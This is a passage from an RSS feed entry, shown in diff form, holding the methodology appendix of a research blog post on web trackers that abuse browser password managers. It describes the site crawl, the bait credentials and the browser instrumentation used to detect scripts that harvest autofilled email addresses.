-&lt;p&gt;We crawled 50,000 sites from the Alexa top 1 million. We used the following sampling strategy: visit all of the top 15,000 sites, randomly sample 15,000 sites from the Alexa rank range [15,000 100,000), and randomly sample 20,000 sites from the range [100,000, 1,000,000). This combination allowed us to observe the attacks on both high and low traffic sites. On each of these 50,000 sites we visited 6 pages: the front page and a set of 5 other pages randomly sampled from the internal links on the front page.&lt;/p&gt;
-&lt;p&gt;The fake login credentials acted as bait, allowing us to introduce an email and password to the page that could be collected by third parties without any additional interaction. Detection of email address collection was done by inspecting JavaScript calls related to form creation and access, and by the analysis of the HTTP traffic. Specifically, we used the following instrumentation:&lt;/p&gt;
-&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Mutation_events&quot;&gt;Mutation events&lt;/a&gt; to monitor elements inserted to the page DOM. This allowed us to detect the injection of fake login forms. When a mutation event fires, we record the current call stack and serialize the inserted HTML elements.&lt;/li&gt;
-&lt;li&gt;Instrument HTMLInputElement to intercept access to form input fields. We log the input field value that is being read to detect when the bait email (autofilled by the built-in password manager) was sniffed.&lt;/li&gt;
-&lt;li&gt;Store HTTP request and response data, including POST payloads to detect the exfiltration of the email address or password.&lt;/li&gt;
-&lt;/ol&gt;&lt;p&gt;For both JavaScript (1, 2) and HTTP instrumentation (3) we store JavaScript stack traces at the time of the function call or the HTTP request. We then parse the stack trace to pin down the initiators of an HTTP request or the parties responsible for inserting or accessing a form.&lt;/p&gt;
-&lt;p&gt;We then combine the instrumentation data to select scripts that:&lt;/p&gt;
-&lt;ol&gt;&lt;li&gt;inject an HTML element containing a password field (recall that the password field is necessary for the built-in password manager to kick in)&lt;/li&gt;
-&lt;li&gt;read the email address from the input field automatically filled by the browser’s login manager&lt;/li&gt;
-&lt;li&gt;send the email address, or a hash of it, over HTTP&lt;/li&gt;
-&lt;/ol&gt;&lt;p&gt;To verify the findings of the automated experiments we manually analyzed sites that embed the two scripts that match these conditions. We have verified that the forms that the scripts inserted were not visible. We then opened accounts on the sites that allow registration and let the browser store the login information (by clicking yes to the dialog in Figure 1). We then visited another page on the site and verified that browser password manager filled the invisible form injected by the scripts.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Appendix 2 – Code Snippets&lt;/strong&gt;&lt;/p&gt;
-&lt;div id=&quot;attachment_13338&quot; class=&quot;wp-caption alignnone&quot;&gt;&lt;img class=&quot;wp-image-13338&quot; src=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000729/codes-300x190.png&quot; alt=&quot;Code snippets from OnAudience (left) and Adthink (right) that are responsible for the injection of invisible login forms.&quot; width=&quot;650&quot; height=&quot;411&quot; srcset=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000729/codes-300x190.png 300w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000729/codes-768x485.png 768w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000729/codes-600x379.png 600w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000729/codes.png 853w&quot; sizes=&quot;(max-width: 650px) 100vw, 650px&quot; /&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Code snippets from OnAudience (left) and Adthink (right) that are responsible for the injection of invisible login forms.&lt;/p&gt;
-&lt;/div&gt;
-</description>
-<pubDate>Wed, 27 Dec 2017 20:57:32 +0000</pubDate>
-<dc:creator>randomwalker</dc:creator>
-<dc:language>en-US</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/</dc:identifier>
 </item>
 </channel>
 </rss>
